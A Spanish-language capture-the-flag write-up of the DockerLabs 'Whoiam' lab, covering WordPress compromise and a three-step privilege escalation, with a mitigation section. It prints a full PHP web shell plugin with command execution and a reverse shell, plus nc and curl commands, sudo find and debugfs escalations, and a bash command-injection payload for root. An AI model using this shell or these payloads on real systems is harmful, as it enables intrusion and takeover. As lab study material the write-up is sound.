# DockerLabs - Whoiam

**Resumen:** La máquina expone un servidor web WordPress. Mediante fuzzing de directorios se localiza un backup con credenciales válidas del usuario `developer`. Tras acceder al panel de administración, se aprovecha la funcionalidad de subida de plugins para desplegar un plugin malicioso que otorga ejecución remota de comandos. La escalada de privilegios se realiza en tres etapas: primero a `rafa` mediante `sudo find`, luego a `ruben` con `debugfs`, y finalmente a `root` explotando una inyección de comandos en el script `/opt/penguin.sh`.

## Información de la Máquina

| Campo          | Valor      |
| :------------- | :--------- |
| **Plataforma** | DockerLabs |
| **Dificultad** | Fácil      |
| **SO**         | Linux      |
| **IP**         | 172.18.0.2 |

---

## Reconocimiento

### Escaneo inicial

Se verificó la conectividad con el objetivo y, acto seguido, se ejecutó `nmap` para identificar los puertos abiertos.

![Escaneo inicial](assets/Pasted%20image%2020260928200059.png)

Se identificó el puerto 80, por lo que se procedió a inspeccionar el servicio web.

![Servicio web](assets/Pasted%20image%2020260928200124.png)

### Fuzzing de directorios

Dado que la página principal no revelaba información adicional, se realizó un fuzzing de directorios en busca de recursos ocultos que aportaran más contexto.

```bash
gobuster dir -u http://172.18.0.2 -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,zip,rar,jpg,png,svg
```

**Resultado:**

![Fuzzing de directorios](assets/Pasted%20image%2020260928200319.png)

Se accedió a `/license.txt`, que únicamente contenía el texto por defecto generado por WordPress al ser levantado.

### Enumeración web

Al ingresar a `/wp-admin` se visualizó el panel de inicio de sesión de WordPress. Se intentó el acceso con credenciales por defecto pero no hubo resultado.

![Login de WordPress](assets/Pasted%20image%2020260928200554.png)

En `/includes` se observó lo siguiente:

![Directorio includes](assets/Pasted%20image%2020260928201519.png)

Posteriormente, se exploró el directorio `Backups` y se halló:

![Directorio Backups](assets/Pasted%20image%2020260929200843.png)

Al descomprimir el archivo `.zip`, se obtuvo:

![Contenido del zip](assets/Pasted%20image%2020260928211317.png)

| Usuario | Contraseña |
| :--- | :--- |
| developer | 2wmy3KrGDRD%RsA7Ty5n71L^ |

---

## Acceso Inicial

Se probaron las credenciales obtenidas y se logró el acceso:

![Acceso al panel](assets/Pasted%20image%2020260928212102.png)

Para mayor comodidad, se creó un usuario con permisos de administrador.

- **Usuario:** `hacking`
- **Contraseña:** `P$pDWX5KA#@uQrr83z1O9ADi`

**Vulnerabilidad**
- **Tipo:** Subida de archivos arbitrarios (plugin malicioso en WordPress)
- **Endpoint / Servicio:** Panel de administración de WordPress (`/wp-admin`)

![Subida de plugin](assets/Pasted%20image%2020261003144111.png)

Se identificó la posibilidad de subir plugins en formato `.zip`. Aprovechando esta funcionalidad, se creó un archivo PHP malicioso dentro de una carpeta llamada `mi-plugin`, se comprimió con `zip -r mi-plugin.zip mi-plugin` y se subió como plugin. Una vez instalado, se accedió a la siguiente URL para ejecutar comandos:

`http://172.18.0.2/wp-content/plugins/mi-plugin/shell.php?cmd=sudo%20-l`

![Ejecución de comandos](assets/Pasted%20image%2020260928222134.png)

**Contenido del `.php` que va dentro del `mi-plugin`:**

```php
<?php
/*
Plugin Name: CTF Shell
Description: Shell for the CTF lab.
Version: 1.0
*/

$cmd = 'cmd';

if (isset($_REQUEST[$cmd])) {
    executeCommand($_REQUEST[$cmd]);

} elseif (isset($_REQUEST['ip'])) {

    $ip = $_REQUEST['ip'];
    $port = isset($_REQUEST['port']) ? (int)$_REQUEST['port'] : 4444;

    if (!filter_var($ip, FILTER_VALIDATE_IP)) {
        die("Invalid IP");
    }

    if ($port < 1 || $port > 65535) {
        die("Invalid port");
    }

    $sock = fsockopen($ip, $port, $errno, $errstr, 5);

    if (!$sock) {
        die("Connection failed: $errstr ($errno)");
    }

    $descriptors = [
        0 => $sock,
        1 => $sock,
        2 => $sock
    ];

    $process = proc_open('/bin/bash -i', $descriptors, $pipes);

    if (is_resource($process)) {
        proc_close($process);
    }

    fclose($sock);
}

function executeCommand(string $command): void
{
    system($command);
}
?>
```

---

A continuación, se inició un listener con `netcat` en el puerto 4444 y, en otra terminal, se ejecutó:

```bash
nc -lvnp 4444
```

Realizado el comando anterior, procedemos a abrir una shell paralela y ponemos el siguiente comando.

```bash
curl -v --get --data-urlencode "ip=172.18.0.2" --data-urlencode "port=4444" "http://172.18.0.2//wp-content/plugins/shell2/shell2.php"
```

---

## Shell como www-data

Se ejecutó `sudo -l` y se obtuvo:

![sudo -l www-data](assets/Pasted%20image%2020260928224521.png)

---

## Escalada de Privilegios

### Escalada a rafa

Se aprovechó el permiso de `sudo` sobre `find` para obtener una shell como `rafa`:

```bash
sudo -u rafa find . -exec /bin/sh \; -quit
```

Resultado:

![Escalada a rafa](assets/Pasted%20image%2020260930184324.png)

Una vez dentro, se enumeraron los permisos de `rafa` y se buscaron otros usuarios para continuar la escalada.

![Enumeración rafa](assets/Pasted%20image%2020260930184529.png)

### Escalada a ruben

Se utilizó `debugfs` con permisos de `sudo` para escalar a `ruben`:

```bash
sudo -u ruben debugfs
```

![Escalada a ruben](assets/Pasted%20image%2020260930184548.png)

Dentro de la sesión, se verificó con `sudo -l` que `ruben` podía ejecutar un script `.sh` con `/bin/bash` ubicado en `/opt`.

![Permisos ruben](assets/Pasted%20image%2020260930184745.png)

### Escalada a root

Se accedió al directorio y se inspeccionó el contenido del script con `cat`. El script validaba que la variable `$num` fuera igual a `42`. Tras varias pruebas, se observó que aceptaba expresiones como `a+42` y devolvía "Correct". Aprovechando esta validación, se buscó un comando que, al ser evaluado, permitiera obtener una shell de bash.

![Script penguin.sh](assets/Pasted%20image%2020260928230538.png)

Finalmente, se ejecutó el script como root:

```bash
sudo -u root /bin/bash /opt/penguin.sh
```

Cuando solicitó el input, se ingresó:

```bash
a[$(/bin/bash>&2)]+42
```

Como resultado, se obtuvo una shell como `root`, finalizando la máquina.

![Root obtenido](assets/Pasted%20image%2020260928235535.png)

---

## Más Allá de Root

**Análisis Post-Explotación**
- **Lo que funcionó:** La subida de plugins maliciosos en WordPress para obtener ejecución remota de comandos, y el encadenamiento de `sudo` con binarios inusuales (`find`, `debugfs`).
- **Lo que falló:** Los intentos iniciales con credenciales por defecto en el login de WordPress.
- **Herramientas nuevas:** Uso de `debugfs` para escalar privilegios a otro usuario.
- **Para la próxima:** Automatizar la creación y subida de plugins maliciosos para agilizar la fase de foothold en WordPress.

---

## Mitigación

Contramedidas recomendadas para cada vulnerabilidad identificada durante la auditoría, ordenadas según la fase del ataque en la que fueron explotadas.

### Exposición de credenciales en backups

**Vulnerabilidad:** El directorio `/includes` exponía un archivo `.zip` con credenciales en texto plano del usuario `developer`.

**Mitigaciones:**
- Restringir el acceso a directorios sensibles mediante reglas en el servidor web (`.htaccess`, `nginx.conf`) o eliminar directorios de backups del árbol público.
- Almacenar credenciales en gestores de secretos (Vault, AWS Secrets Manager) y nunca en archivos planos accesibles vía HTTP.
- Implementar políticas de rotación de contraseñas y forzar credenciales robustas.
- Añadir reglas en el WAF para bloquear el acceso a extensiones como `.zip`, `.bak`, `.sql`, `.old` desde el exterior.

### Subida arbitraria de plugins en WordPress

**Vulnerabilidad:** Un usuario con permisos de administrador podía subir un plugin malicioso en formato `.zip`, obteniendo ejecución remota de comandos.

**Mitigaciones:**
- Aplicar el principio de mínimo privilegio: solo los administradores estrictamente necesarios deben tener la capacidad de instalar plugins.
- Deshabilitar la edición de archivos y la instalación de plugins desde el panel (`DISALLOW_FILE_MODS` y `DISALLOW_FILE_EDIT` en `wp-config.php`).
- Verificar la integridad de los plugins mediante firmas digitales y comparación de hashes.
- Mantener WordPress, temas y plugins actualizados; eliminar los que no se utilicen.
- Implementar un WAF con reglas específicas para WordPress (ModSecurity, Wordfence) que detecte subidas anómalas de archivos `.zip` con PHP embebido.

### Escalada vía `sudo find`

**Vulnerabilidad:** El usuario `www-data` podía ejecutar `find` como `rafa` mediante `sudo`, lo que permite ejecución arbitraria de comandos con `-exec`.

**Mitigaciones:**
- Auditar periódicamente las reglas de `sudoers` con `sudo -l` para cada usuario y eliminar permisos innecesarios.
- Evitar delegar binarios que permitan ejecución de comandos (`find`, `vim`, `less`, `awk`, `python`, etc.). Si es imprescindible, restringir los argumentos permitidos.
- Aplicar el principio de mínimo privilegio: otorgar permisos `sudo` únicamente sobre comandos específicos y con argumentos acotados.
- Usar `NOEXEC` o `NOPASSWD` con precaución, y preferir wrappers o scripts controlados en lugar del binario directo.

### Escalada vía `debugfs`

**Vulnerabilidad:** El usuario `rafa` podía ejecutar `debugfs` como `ruben` mediante `sudo`, permitiendo acceso al sistema de archivos y escalada.

**Mitigaciones:**
- Eliminar permisos `sudo` sobre herramientas de bajo nivel que otorguen acceso al sistema de archivos.
- Considerar `debugfs` como binario crítico y restringir su ejecución únicamente al usuario `root`.
- Implementar listas blancas de comandos permitidos en lugar de listas negras.

### Inyección de comandos en `/opt/penguin.sh`

**Vulnerabilidad:** El script `/opt/penguin.sh`, ejecutable como `root`, validaba el input del usuario sin sanitizarlo, permitiendo inyección de comandos mediante sustitución (`$(...)`).

**Mitigaciones:**
- **Nunca** confiar en input del usuario. Validar y sanitizar toda entrada mediante expresiones regulares que acepten únicamente el formato esperado (por ejemplo, `^[0-9]+$`).
- Evitar el uso de `eval`, backticks y `$(...)` sobre variables controladas por el usuario.
- Ejecutar scripts con el menor privilegio posible; si un script no requiere `root`, no debe ejecutarse como tal.
- En Bash, citar siempre las variables (`"$num"`) y usar `[[ ]]` en lugar de `[ ]` para comparaciones más seguras.
- Implementar revisión de código para scripts con `sudo` y aplicar herramientas de análisis estático (ShellCheck).

**Defensa en Profundidad:** Ninguna de estas mitigaciones es efectiva de forma aislada. La combinación de controles preventivos (mínimo privilegio, sanitización), detectivos (WAF, monitoreo de integridad) y correctivos (rotación de credenciales, parcheo) es lo que realmente reduce la superficie de ataque.

---

## Referencias

- [GTFOBins - find](https://gtfobins.github.io/gtfobins/find/)
- [GTFOBins - debugfs](https://gtfobins.github.io/gtfobins/debugfs/)
- [OWASP - Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [Sudoers Manual - NOEXEC](https://www.sudo.ws/docs/man/sudoers.man/)
